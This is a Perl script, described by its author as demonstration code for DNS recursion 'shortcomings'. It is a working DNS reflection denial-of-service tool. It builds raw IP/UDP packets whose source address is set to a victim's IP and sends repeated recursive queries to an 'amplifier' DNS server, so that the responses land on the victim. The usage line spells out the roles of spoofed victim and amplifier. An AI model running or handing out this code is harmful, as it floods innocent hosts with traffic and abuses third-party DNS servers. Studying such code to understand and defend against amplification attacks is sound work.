#!/usr/bin/perl -w

use strict;
use Socket;

# by John Lampe....jwlampe@gapac.com  
# Demonstration code to show inherent "shortcomings" with DNS recursive queries

# from RFC 1035 ##########################

#Header
#Question
#Answer
#Authority
#Additional

#HEADER:
#16 bit ID
#QR -- 1 bit query=0, response=1
#OPCODE -- 4 bits 0 = standard, 1=inverse, 2=server status, 3-15 reserved
#AA -- 1 bit, set if server=SOA
#TC -- 1 bit if message truncated
#RD - 1 bit if recursion is desired (it is ;-) )
#RA - 1 bit to denote if recursion is supported
#Z- 4 bits must be set to 0 (reserved for future use)
#RCODE - set in responses (we won't worry about this)
#QDCOUNT - 16 bits, specifies number of entries in question section
#ANCOUNT - number of records in answer (we won't need this either)
#NSCOUNT (won't need this as well)
#ARCOUNT (won't need this either)

#QUESTION:
#QNAME - our domain name (f00dikator.penguinpowered.com...could be anything)...no need for padding
#QTYPE - type 1 (A record text)
#QCLASS - 16 bits to denote type of query (Internet in our example)

####################################

my $sip = shift;
my $dip = shift;
my $dport = shift;
my $totalbytessent;

if ($sip eq "" || $dip eq "" || $dport eq "") {YewSage(); exit(0);}


# Create DNS HEADER
# NOTE Recursion Desired (RD) = 1...we've already scoped out our recursive DNS server

my $query = "\x31\x33"  .        # 16 bit ID
            "\x01\x00"  .        # QR=0 Opcode=0000 AA=0 TC=0 RD=1 RA=0 Z=000 RCODE=0000
            "\x00\x01"  .        # QDCOUNT = 1
            "\x00\x00"  .        # ANCOUNT = 0
            "\x00\x00"  .        # NSCOUNT = 0
            "\x00\x00"  .        # ARCOUNT = 0
         
# put together a QNAME
        
            "\x04"      .                                                         
	    "mail" .
            "\x10" .                                                        
	    "wealthfoundation" .
            "\x03" .                                                        # 3
            "com" .                                                # com

# tie off (NULL terminator)

            "\x00" . 

# QTYPE  (A record)

            "\x00\x01" 
. 
# QCLASS   (Internet) 

            "\x00\x01";


for ($b=0; $b<100; $b++) {
  blowup ($query,$dip,$dport);
}

print "$totalbytessent Total bytes sent\n";
 
exit(0);


sub blowup {
	my ($query,$dip,$dport) = @_;
        my $destip = pack('C4', split(/\./,$dip) );          
        my $sourceip = pack('C4', split(/\./,$sip) );
        my $sourceport = "\x00\x35";                  #port 53
        $dip = (gethostbyname($dip))[4];
	my ($PROTO_RAW) = 255;
	my ($PROTO_IP) = 17;
	my ($IP_HDRINCL) = 1; 
        my $ipchksum = "\x00\x00";                #we'll change later
        my $udplen = "\x00\x28";

	socket(S, AF_INET, SOCK_RAW, $PROTO_RAW) || die "Damn...no Socket. $!\n";
	setsockopt(S, $PROTO_IP, $IP_HDRINCL, 1);	
        my $packet = "\x45\x00\x00\xFF" .         # ver, len, TOS, length in bytes
                     "\x7A\x69\x00\x00" .         # ID, flags, frag offset
                     "\x40\x11" . $ipchksum .     # TTL, Proto, chksum
                     $sourceip          .         # src IP
                     $destip;                     # Our amplifier 

        $ipchksum = pack ('S' , calc_chksum ($packet));

        $packet =    "\x45\x00\x00\xFF" .         
                     "\x7A\x69\x00\x00" .         
                     "\x40\x11" . $ipchksum .     # new chksum
                     $sourceip          .         
                     $destip .                    
                     $sourceport . $sourceport .  # src port= dst port = 53
                     $udplen . "\x00\x00";          # UDP len, UDP chksum (don't need one)

	my ($dest) = pack('S n a4 x8', AF_INET, $dport, $dip);
        $packet .= $query;
	send (S,$packet,0, $dest) || die "Damn...couldn't send. $!\n";
	$totalbytessent += length($packet);
        print "Packet sent\n";
}






sub calc_chksum {
        my ($packet) = @_;
        my ($len_msg,$num_short,$short,$chk);
        $len_msg = length($packet);           
        $num_short = $len_msg / 2;                         # number of short words 
        $chk = 0;
        foreach $short (unpack("S$num_short", $packet)) {  # unpack $packet into an array of shorts
                $chk += $short;                            # sum all short words
        }
        $chk = ($chk >> 16) + ($chk & 0xffff);             # find carried values and add to low order 16 bits
        return(~(($chk >> 16) + $chk) & 0xffff);           # flip bits, and return value
}






sub YewSage {
    print "./dns_upd.pl <spoofed IP/victim> <Amplifier> <port>\n";
}





